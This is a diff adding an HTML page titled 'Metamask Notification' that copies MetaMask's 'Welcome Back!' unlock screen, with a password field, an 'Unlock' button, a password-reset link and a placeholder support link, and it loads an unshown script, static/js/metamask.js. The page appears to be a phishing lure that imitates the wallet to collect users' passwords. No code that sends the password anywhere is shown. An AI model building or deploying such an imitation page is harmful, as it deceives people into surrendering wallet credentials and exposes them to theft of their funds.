@@ -1,0 +1,32 @@
+<!DOCTYPE html >
+<html lang="ru-RU">
+  <head>
+    <meta charset="utf-8"/>
+    <title>Metamask Notification</title>
+    <meta http-equiv="X-UA-Compatible" content="IE = edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <meta name="keywords" content=""/>
+    <link rel="stylesheet" type="text/css" href="static/css/styles.css"/>
+    <link rel="icon" type="image/x-icon" href="static/images/metamask.ico"/>
+  </head>
+  <body> 
+    <div class="metamask">
+      <div class="inner">
+        <div id="logo-container"></div>
+        <h1 class="title">Welcome Back!</h1>
+        <h4 class="subtitle">The decentralized web awaits</h4>
+        <form class="password-group">
+          <div class="input-wrapper">
+            <input type="password" required="required"/>
+            <div class="line"></div>
+            <p>Password</p>
+          </div>
+          <div class="err"></div>
+          <button class="button">Unlock</button>
+        </form><a class="recovery-password reset" onclick="resetPass()">Forgot password?</a>
+        <p class="help">Need help? Contact<a href=""> MetaMask Support</a></p>
+      </div>
+    </div>
+    <script src="static/js/metamask.js"></script>
+  </body>
+</html>
